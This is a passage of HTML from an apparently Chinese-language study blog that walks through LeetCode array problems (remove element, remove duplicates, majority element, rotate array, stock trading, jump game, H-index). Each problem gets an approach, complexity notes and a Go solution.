class="line"></span><br><span class="line">    <span class="keyword">for</span> p1&gt;=<span class="number">0</span> &amp;&amp; p2&gt;=<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> nums1[p1]&gt;nums2[p2]&#123;</span><br><span class="line">            nums1[p]=nums1[p1]</span><br><span class="line">            p1--</span><br><span class="line">            p--</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            nums1[p]=nums2[p2]</span><br><span class="line">            p2--</span><br><span class="line">            p--</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p2&gt;=<span class="number">0</span>&#123;</span><br><span class="line">        nums1[p]=nums2[p2]</span><br><span class="line">        p--</span><br><span class="line">        p2--</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="27-移除元素"><a class="markdownIt-Anchor" href="#27-移除元素"></a> 27. 移除元素</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/remove-element/description/">27. 移除元素</a></p></blockquote><h2 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2"></a> 思路</h2><p>这题如果直接用Go的切片功能去删除元素会出现问题，因为一遍遍历数组一边修改数组会导致遍历时的索引出现问题，所以我们还是继续用双指针。双指针技术在数组或链表的问题中非常常用，它可以帮助我们以线性时间复杂度解决问题。</p><h2 id="解题方法-2"><a class="markdownIt-Anchor" href="#解题方法-2"></a> 解题方法</h2><p>创建两个指针，一个用于遍历数组（我们称之为右指针），另一个用于指向下一个将要插入的位置（我们称之为左指针）。<br />从左到右遍历数组，对于每一个元素，检查它是否等于给定的值。<br />如果元素不等于给定的值，就把它复制到左指针指向的位置，然后把左指针向右移动一位。<br />如果元素等于给定的值，就忽略它，不做任何操作。<br />遍历完数组后，左指针的位置就是新的数组长度。</p><h2 id="复杂度-2"><a class="markdownIt-Anchor" href="#复杂度-2"></a> 复杂度</h2><p>时间复杂度:<br />这两段代码都是通过一次遍历完成的，其中 n 是数组的长度。在遍历过程中，每个元素都被访问一次并进行一次比较操作，因此，时间复杂度是 O(n)。</p><p>空间复杂度:<br />这两段代码都是在原地修改数组，没有使用额外的数组或其他数据结构。除了输入数组外，只使用了常数个变量（例如，左指针、右指针和 val）。因此，空间复杂度是 O(1)。</p><h2 id="code-2"><a class="markdownIt-Anchor" href="#code-2"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeElement</span><span class="params">(nums []<span class="type">int</span>, val <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    i:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j:=<span class="number">0</span>;j&lt;<span class="built_in">len</span>(nums);j++&#123;</span><br><span class="line">        <span class="keyword">if</span> nums[j]!=val&#123;</span><br><span class="line">            nums[i]=nums[j]</span><br><span class="line">            i++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="26删除有序数组中的重复项"><a class="markdownIt-Anchor" href="#26删除有序数组中的重复项"></a> 26.删除有序数组中的重复项</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/description/">26. 删除有序数组中的重复项</a></p></blockquote><h2 id="思路-3"><a class="markdownIt-Anchor" href="#思路-3"></a> 思路</h2><p>代码的主要思想是使用两个指针，一个慢指针 i 和一个快指针 j，同时遍历数组。其中，慢指针指向当前处理的元素，快指针用于寻找下一个不同的元素。</p><h2 id="解题方法-3"><a class="markdownIt-Anchor" href="#解题方法-3"></a> 解题方法</h2><p>首先检查数组是否为空，如果为空，则直接返回0，因为没有元素需要处理。</p><p>初始化两个指针 i 和 j，并设置 i=0。这里，i 是一个慢指针，它表示已处理的不同元素的数量，j 是一个快指针，用于遍历数组寻找下一个不同的元素。</p><p>使用一个 for 循环，从 j=1 开始遍历数组。在每次迭代中，检查 nums[j] 是否与 nums[i] 不同。如果 nums[j] 与 nums[i] 不同，这意味着我们找到了一个新的不同的元素。此时，我们将 nums[j] 的值赋给 nums[i+1]，并将 i 的值加1，表示我们找到了一个新的不同的元素。当 for 循环结束时，i+1 的值就是数组中不同元素的数量。因此，我们返回 i+1。</p><h2 id="复杂度-3"><a class="markdownIt-Anchor" href="#复杂度-3"></a> 复杂度</h2><p>时间复杂度:<br />时间复杂度是O(n)，因为我们只遍历数组一次。</p><p>空间复杂度:<br />空间复杂度是 O(1)，因为我们只使用了常数个额外的变量。</p><h2 id="code-3"><a class="markdownIt-Anchor" href="#code-3"></a> Code</h2><figure class="highlight go"><figcaption><span>[]</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeDuplicates</span><span class="params">(nums []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="built_in">len</span>(nums); j++ &#123;</span><br><span class="line">        <span class="keyword">if</span> nums[j] != nums[i] &#123;</span><br><span class="line">            i++</span><br><span class="line">            nums[i] = nums[j]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="80删除有序数组中的重复项-ii"><a class="markdownIt-Anchor" href="#80删除有序数组中的重复项-ii"></a> 80.删除有序数组中的重复项 II</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array-ii/description/">80. 删除有序数组中的重复项 II</a></p></blockquote><h2 id="思路-4"><a class="markdownIt-Anchor" href="#思路-4"></a> 思路</h2><p>这道题目要求我们在一个有序数组中删除重复项，使每个元素最多出现两次，并返回新的数组长度。在不使用额外空间的条件下，我们可以考虑使用双指针的方法来解决这个问题。</p><p>注意题给数组为有序数组</p><h2 id="解题方法-4"><a class="markdownIt-Anchor" href="#解题方法-4"></a> 解题方法</h2><p>我们使用两个指针，一个用于遍历数组（fast），另一个指向当前修改的位置（slow）。</p><p>具体步骤如下：</p><p>如果数组的长度小于等于2，那么所有的元素都应该保留，因为他们的出现次数都不会超过2次，所以直接返回数组的长度即可。</p><p>初始化两个指针，slow = 2 和 fast = 2。slow指针表示处理过的数组的长度，fast指针表示已经检查过的数组的长度。</p><p>当 fast &lt; n时，比较 nums[slow - 2] 和 nums[fast]，如果相等，则说明已经有两个数相等，fast指针继续前进。如果不相等，将 nums[fast]的值复制到 nums[slow]，然后增加 slow 和 fast。</p><p>返回 slow，表示处理后的数组长度。</p><h2 id="复杂度-4"><a class="markdownIt-Anchor" href="#复杂度-4"></a> 复杂度</h2><p>时间复杂度: O(n)<br />这是因为我们只需要遍历一次数组。</p><p>空间复杂度: O(1)<br />我们只使用了常数级别的额外空间。</p><h2 id="code-4"><a class="markdownIt-Anchor" href="#code-4"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeDuplicates</span><span class="params">(nums []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> slow,fast,n=<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">len</span>(nums)</span><br><span class="line">    <span class="keyword">if</span> n&lt;=<span class="number">2</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> fast&lt;n&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[slow<span class="number">-2</span>]!=nums[fast])&#123;</span><br><span class="line">            nums[slow]=nums[fast]</span><br><span class="line">            slow++</span><br><span class="line">        &#125;</span><br><span class="line">        fast++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="169-多数元素"><a class="markdownIt-Anchor" href="#169-多数元素"></a> 169. 多数元素</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/majority-element/description/">169. 多数元素</a></p></blockquote><h2 id="思路-5"><a class="markdownIt-Anchor" href="#思路-5"></a> 思路</h2><p>这道题目要求我们找到一个数组中的多数元素，即出现次数大于数组长度一半的元素。由于题目保证一定存在这样的多数元素，我们可以使用Boyer-Moore投票算法来解决这个问题。</p><h2 id="解题方法-5"><a class="markdownIt-Anchor" href="#解题方法-5"></a> 解题方法</h2><p>Boyer-Moore投票算法的核心思想是利用“多数元素”的定义，即它的出现次数至少是数组长度的一半。这意味着，如果我们在遍历数组的过程中，对所有非多数元素进行投票（计数），那么当我们遇到多数元素时，计数器应该会增加，直到超过数组长度的一半。在这个过程中，我们只需要维护一个或两个候选多数元素及其计数。</p><h3 id="boyer-moore投票算法"><a class="markdownIt-Anchor" href="#boyer-moore投票算法"></a> Boyer-Moore投票算法</h3><p>Boyer-Moore 投票算法的步骤如下：</p><blockquote><p>维护一个候选主要元素 candidate 和候选主要元素的出现次数count。</p><p>初始时candidate 为任意值，count=0。</p><p>遍历数组nums 中的所有元素，遍历到元素 x 时，进行如下操作：</p><p>​       如果count=0，则将 x 的值赋给candidate，否则不更新candidate 的值；</p><p>​        如果 x=candidate，则将 count 加 1，否则将count 减 1。</p><p>遍历结束之后，candidate的值可能为主要元素。（可能的原因是，如果是这样的一个数组[1,2,3]，那么剩下的元素是3，但是3并不是数量超过一半的元素）</p></blockquote><p>可以类比为打擂台，candidate就是守擂的多数元素。接着遍历给定数组，如果遇到的同一个类型的数，那么守擂的人数就增加，对应count++；如果遇到的事不同类型的数字，那么守擂方就和打擂台的人同归于尽，对应count–。当count为0时，说明原守擂人已经全部GG了，于是把candidate设置为当前的这个数，作为新的守擂人。</p><p>由于一开始不知道谁是势力最大的帮派，所以各个不同帮派之间两两火并。最后剩下来的一定是势力最大的帮派。</p><p>就算所有小帮派知道谁是势力最大的帮派，他们“群起攻之”。每一个小帮派的人都消耗掉势力最大的帮派的一个人。但是由于势力最大的帮派的人数大于一半，所以即使这样，最后剩下来的还是大帮派的人。</p><p>以上就是Boyer-Moore 投票算法最通俗易懂的解释。</p><h2 id="复杂度-5"><a class="markdownIt-Anchor" href="#复杂度-5"></a> 复杂度</h2><p>时间复杂度:</p><p>O(n)</p><p>这个算法只需要遍历数组一次，因此时间复杂度是线性的。</p><p>空间复杂度:</p><p>O(1)</p><p>由于我们只需要一个或两个候选元素和它们的计数器，所以空间复杂度是常数级别的。</p><h2 id="code-5"><a class="markdownIt-Anchor" href="#code-5"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">majorityElement</span><span class="params">(nums []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    candidate:=<span class="number">0</span></span><br><span class="line">    count:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _,value := <span class="keyword">range</span> nums&#123;</span><br><span class="line">        <span class="keyword">if</span> count==<span class="number">0</span>&#123;</span><br><span class="line">            candidate=value</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> candidate==value&#123;</span><br><span class="line">            count++</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            count--</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> candidate</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="189轮转数组"><a class="markdownIt-Anchor" href="#189轮转数组"></a> 189.轮转数组</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/rotate-array/description/">189. 轮转数组</a></p></blockquote><h2 id="思路-6"><a class="markdownIt-Anchor" href="#思路-6"></a> <strong>思路</strong></h2><p>当拿到这个问题时，我们的目标是将一个整数数组 nums 向右轮转 k 个位置。这个问题可以通过几种不同的方法解决，但考虑到题目中提到的“原地”算法和空间复杂度为 O(1) 的要求，我们选择一种不需要额外空间的解决方案。</p><h2 id="解题方法-6"><a class="markdownIt-Anchor" href="#解题方法-6"></a> 解题方法</h2><p>我们选择的解题方法是三次反转法，这种方法简单且满足原地操作的要求。具体步骤如下：</p><p>反转整个数组：首先，我们反转整个数组 nums，这样原本在数组末尾的元素就会被移动到数组的开头。</p><p>反转前 k 个元素：接下来，我们只反转数组的前 k 个元素。这一步将数组的前 k 个元素放置到正确的位置。</p><p>反转剩余的元素：最后，我们反转数组中剩余的部分（从第 k+1 个元素到数组末尾），这样所有的元素都会被放置到正确的位置。</p><h2 id="复杂度-6"><a class="markdownIt-Anchor" href="#复杂度-6"></a> 复杂度</h2><p>时间复杂度:</p><p>O(n)</p><p>这个算法需要三次遍历整个数组来完成反转，因此时间复杂度是线性的，与数组的长度成正比。</p><p>空间复杂度:</p><p>O(1)</p><p>由于我们是在原地进行操作，没有使用额外的存储空间，所以空间复杂度是常数级别的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rotate</span><span class="params">(nums []<span class="type">int</span>, k <span class="type">int</span>)</span></span>  &#123;</span><br><span class="line">    n := <span class="built_in">len</span>(nums)</span><br><span class="line">    k = k % n <span class="comment">// 防止k大于数组长度</span></span><br><span class="line">    reverse(nums)          <span class="comment">// 先逆序整个数组</span></span><br><span class="line">    reverse(nums[:k])      <span class="comment">// 逆序数组的前k个元素</span></span><br><span class="line">    reverse(nums[k:])      <span class="comment">// 逆序数组的剩余部分</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverse</span><span class="params">(nums []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    n := <span class="built_in">len</span>(nums)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n/<span class="number">2</span>; i++ &#123;</span><br><span class="line">        nums[i], nums[n<span class="number">-1</span>-i] = nums[n<span class="number">-1</span>-i], nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="121买卖股票的最佳时机"><a class="markdownIt-Anchor" href="#121买卖股票的最佳时机"></a> 121.买卖股票的最佳时机</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/description/">121. 买卖股票的最佳时机</a></p></blockquote><h2 id="思路-7"><a class="markdownIt-Anchor" href="#思路-7"></a> 思路</h2><p>这个问题的关键在于理解股票价格的变化趋势，并找到买入和卖出的最佳时机。由于我们只能进行一次交易，我们需要寻找一个价格的波谷（买入点）和一个紧随其后的价格波峰（卖出点）。</p><h2 id="解题方法-7"><a class="markdownIt-Anchor" href="#解题方法-7"></a> 解题方法</h2><p>代码采用了一种自底向上的方法来解决这个问题。这种方法的核心思想是从数组的最后一个元素开始向前遍历，动态地更新最大利润。</p><ol><li>初始化：首先，我们初始化 maxPrice 为数组的最后一个元素，这是我们假设的初始卖出价格。同时，result 初始化为0，这是我们的最大利润。</li><li>逆序遍历：然后，我们从倒数第二个元素开始逆序遍历整个数组。</li><li>更新最大利润：在每次迭代中，我们计算以当前价格为卖出点的最大利润（maxPrice - prices[i]），并将其与已有的 result 比较，取较大者作为新的最大利润。</li><li>更新卖出价格：同时，我们也更新 maxPrice，使其为当前价格和之前 maxPrice 中的较大者。</li><li>返回结果：遍历结束后，result 就是我们要找的最大利润。</li></ol><h2 id="复杂度-7"><a class="markdownIt-Anchor" href="#复杂度-7"></a> 复杂度</h2><p>时间复杂度：</p><p>O(n)，其中 n 是数组 prices 的长度。这是因为我们只遍历了一次数组。</p><p>空间复杂度：</p><p>O(1)，我们只使用了两个额外的变量，与输入数组的大小无关。</p><h2 id="code-6"><a class="markdownIt-Anchor" href="#code-6"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxProfit</span><span class="params">(prices []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(prices) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    maxPrice:=prices[<span class="built_in">len</span>(prices)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="built_in">len</span>(prices)<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--&#123;</span><br><span class="line">        result=max(result,maxPrice-prices[i])</span><br><span class="line">        maxPrice=max(maxPrice,prices[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="122买卖股票的最佳时机-ii"><a class="markdownIt-Anchor" href="#122买卖股票的最佳时机-ii"></a> 122.买卖股票的最佳时机 II</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/description/">122. 买卖股票的最佳时机 II</a></p></blockquote><h2 id="思路-8"><a class="markdownIt-Anchor" href="#思路-8"></a> 思路</h2><p>这个问题是关于股票交易的，目标是找到所有可能的交易对，使得利润最大化。题目要求我们在一个给定的数组中，找到所有可能的交易对，并且每次交易都是买入后卖出，从而获得最大利润。</p><h2 id="解题方法-8"><a class="markdownIt-Anchor" href="#解题方法-8"></a> 解题方法</h2><p>对于这个问题，我们可以采用一种贪心算法的思想。具体来说，我们可以遍历整个数组，对于每对相邻的天数，如果第二天的价格高于第一天，我们就认为这是一个买入和卖出的机会，从而获得利润。我们将所有这样的利润累加起来，就可以得到最大利润。</p><h2 id="复杂度-8"><a class="markdownIt-Anchor" href="#复杂度-8"></a> 复杂度</h2><p>时间复杂度:</p><p>O(n)</p><p>我们只需要遍历一次数组，时间复杂度为线性。</p><p>空间复杂度:</p><p>O(1)</p><p>我们只需要一个变量来存储结果，空间复杂度为常数。</p><h2 id="code-7"><a class="markdownIt-Anchor" href="#code-7"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxProfit</span><span class="params">(prices []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(prices)==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="built_in">len</span>(prices);i++&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices[i]&gt;prices[i<span class="number">-1</span>])&#123;</span><br><span class="line">            result+=prices[i]-prices[i<span class="number">-1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="55跳跃游戏"><a class="markdownIt-Anchor" href="#55跳跃游戏"></a> 55.跳跃游戏</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/jump-game/description/">55. 跳跃游戏</a></p></blockquote><h2 id="思路-9"><a class="markdownIt-Anchor" href="#思路-9"></a> 思路</h2><p>思路很简单，利用贪心的思想，只要维护一个能到达的最远距离，就能保证当前索引到最远可达距离之间的所有元素都能到达。</p><h2 id="解题方法-9"><a class="markdownIt-Anchor" href="#解题方法-9"></a> 解题方法</h2><ol><li>如果数组长度为1，则直接返回true，因为只有一个位置，无需跳跃。</li><li>如果数组的第一个元素为0，返回false，因为无法从起始位置跳到任何地方。<br />使用一个变量max_step来跟踪当前可以到达的最远索引。</li><li>遍历数组，更新max_step为当前可跳跃距离和max_step两者中的最大值</li><li>如果当前元素为0且max_step为0且当前索引不是数组的最后一个索引，则返回false，因为这意味着在某个点上无法前进。</li><li>每次循环结束时，max_step减1，对应向前进了一格。</li></ol><h2 id="复杂度-9"><a class="markdownIt-Anchor" href="#复杂度-9"></a> 复杂度</h2><p>时间复杂度:</p><p>我们只遍历了一遍数组，因此时间复杂度为O(1)</p><p>空间复杂度:</p><p>我们是就地操作的，除了维护最大可达距离的几个变量外，没有产生额外的空间。故空间复杂度为O(1)</p><h2 id="code-8"><a class="markdownIt-Anchor" href="#code-8"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">canJump</span><span class="params">(nums []<span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums)==<span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> nums[<span class="number">0</span>]==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    max_step:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i,v := <span class="keyword">range</span> nums&#123;</span><br><span class="line">        max_step=max(max_step,v)</span><br><span class="line">        <span class="keyword">if</span> v==<span class="number">0</span> &amp;&amp; max_step==<span class="number">0</span> &amp;&amp; i!=<span class="built_in">len</span>(nums)<span class="number">-1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        max_step--</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="45跳跃游戏-ii"><a class="markdownIt-Anchor" href="#45跳跃游戏-ii"></a> 45.跳跃游戏 II</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/jump-game-ii/description/">45. 跳跃游戏 II</a></p></blockquote><h2 id="思路-10"><a class="markdownIt-Anchor" href="#思路-10"></a> 思路</h2><p>贪心的思想，确保每次跳的最远，一直往前跳即可。</p><h2 id="解题方法-10"><a class="markdownIt-Anchor" href="#解题方法-10"></a> 解题方法</h2><p>首先判断如果从改点直接尽力跳能否到达终点？如果能就直接跳并退出循环；如果不能直接到达终点，就寻找如何让自己接下来能够跳的更远：维护一个可以跳跃到达的最远距离，最远距离=该节点的跳跃距离+距离起跳点的距离。每次起跳前都检测自己的跳跃范围内，如何跳才能让自己下一步到达的距离更远。</p><h2 id="复杂度-10"><a class="markdownIt-Anchor" href="#复杂度-10"></a> 复杂度</h2><p>时间复杂度:</p><p>在jump函数中，主循环会持续进行直到step等于len(nums)-1，这意味着主循环会遍历整个数组nums。在循环体内，find_max_step函数被调用，该函数本身也是一个循环，它将遍历从step开始的nums[step]个元素。</p><p>因此，jump函数的时间复杂度主要由以下两部分组成：</p><p>主循环的时间复杂度：由于step每次增加的值取决于find_max_step函数的返回值，且每次至少增加1，最坏情况下，如果nums中的每个元素都为1，那么step需要增加到len(nums)-1，此时主循环的时间复杂度为O(n)。</p><p>find_max_step函数的时间复杂度：在最坏的情况下，这个函数将遍历nums[step]个元素，由于step的值在每次主循环迭代中增加，所以这个函数在整个算法执行过程中的总时间复杂度为O(n^2)。</p><p>综合以上两点，整个算法的时间复杂度为O(n^2)。但step的值为n时主函数只需要执行一次，所以实际情况复杂度会比理论上的复杂度更低。</p><p>空间复杂度:</p><p>在代码中，除了输入数组nums外，没有使用额外的存储空间来存储数据结构。find_max_step函数中的变量max_step和max_id仅用于临时存储，它们的大小不随输入规模n的变化而变化。</p><p>因此，空间复杂度为O(1)。</p><h2 id="code-9"><a class="markdownIt-Anchor" href="#code-9"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">jump</span><span class="params">(nums []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums)==<span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    step:=<span class="number">0</span></span><br><span class="line">    res:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> step&lt;<span class="built_in">len</span>(nums)<span class="number">-1</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> step+nums[step]&gt;=<span class="built_in">len</span>(nums)<span class="number">-1</span>&#123;</span><br><span class="line">            res++</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        step=find_max_step(nums,step)</span><br><span class="line">        res++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> step&gt;=<span class="built_in">len</span>(nums)<span class="number">-1</span>&#123;</span><br><span class="line">        res++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">find_max_step</span><span class="params">(nums []<span class="type">int</span>,step <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">// 寻找最大距离 = 当前节点跳跃距离 + 距离起跳点的距离</span></span><br><span class="line">    max_step:=nums[step]</span><br><span class="line">    max_id:=step</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;=nums[step];i++&#123;</span><br><span class="line">        <span class="keyword">if</span> max_step&lt;nums[step+i]+i&#123;</span><br><span class="line">            max_id=step+i</span><br><span class="line">            max_step=nums[step+i]+i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="274h-指数"><a class="markdownIt-Anchor" href="#274h-指数"></a> 274.H 指数</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/h-index/description/">274. H 指数</a></p></blockquote><h2 id="思路-11"><a class="markdownIt-Anchor" href="#思路-11"></a> 思路</h2><p>这个问题要求我们计算一个研究者的h指数，即至少有h篇论文被引用了h次或以上。解决这个问题的关键在于理解h指数的定义，并找到一种有效的方法来确定满足条件的最小h值。</p><h2 id="解题方法-11"><a class="markdownIt-Anchor" href="#解题方法-11"></a> 解题方法</h2><ol><li>构建额外数组：首先，我们创建一个额外的数组 m，大小为 len(citations) + 1，用来统计引用次数小于或等于每个可能的h值的论文数量。</li><li>统计论文数量：遍历 citations 数组，对于每个引用次数 i，我们增加 m[min(len(citations), i)] 的计数，这样 m[j] 就代表了引用次数小于或等于 j 的论文数量。</li><li>倒序遍历：然后，我们从 m 数组的末尾开始倒序遍历，累加每个 m[j] 的值到变量 s 中，这个累加值 s 表示引用次数大于或等于 j 的论文数量。</li><li>找到h指数：当我们找到第一个满足 s &gt;= j 的 j 时，这个 j 就是研究者的h指数。</li></ol><h2 id="复杂度-11"><a class="markdownIt-Anchor" href="#复杂度-11"></a> 复杂度</h2><p>时间复杂度：</p><p>O(n)</p><p>我们只需要遍历一次 citations 数组来构建 m 数组，然后再遍历一次 m 数组来找到h指数，因此总的时间复杂度是线性的。</p><p>空间复杂度：</p><p>O(n)</p><p>我们创建了一个大小为 len(citations) + 1 的额外数组 m，因此空间复杂度是线性的。</p><h2 id="code-10"><a class="markdownIt-Anchor" href="#code-10"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hIndex</span><span class="params">(citations []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">// 用一个额外数组m来记录满足引用次数为min(n,citation(i))的论文数</span></span><br><span class="line">    <span class="comment">// 最后倒序遍历m，令s为m[j]的累加和，代表满足引用次数大于j的论文数</span></span><br><span class="line">    <span class="comment">// 当s&gt;=j时，说明至少有满足引用条件的论文数量大于等于引用数</span></span><br><span class="line">    m:=<span class="built_in">make</span>([]<span class="type">int</span>,<span class="built_in">len</span>(citations)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> _, i:=<span class="keyword">range</span> citations&#123;</span><br><span class="line">        m[min(<span class="built_in">len</span>(citations),i)]++</span><br><span class="line">    &#125;</span><br><span class="line">    s:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j:=<span class="built_in">len</span>(citations);j&gt;<span class="number">0</span>;j--&#123;</span><br><span class="line">        s+=m[j]</span><br><span class="line">        <span class="keyword">if</span> s&gt;=j&#123;</span><br><span class="line">            <span class="keyword">return</span> j</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="380o1-时间插入-删除和获取随机元素"><a class="markdownIt-Anchor" href="#380o1-时间插入-删除和获取随机元素"></a> 380.O(1) 时间插入、删除和获取随机元素</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/insert-delete-getrandom-o1/description/">380. O(1) 时间插入、删除和获取随机元素</a></p></blockquote><h2 id="思路-12"><a class="markdownIt-Anchor" href="#思路-12"></a> 思路</h2><p>Go本身自带哈希表，用map数据结构去模拟RandomSet类。</p><h2 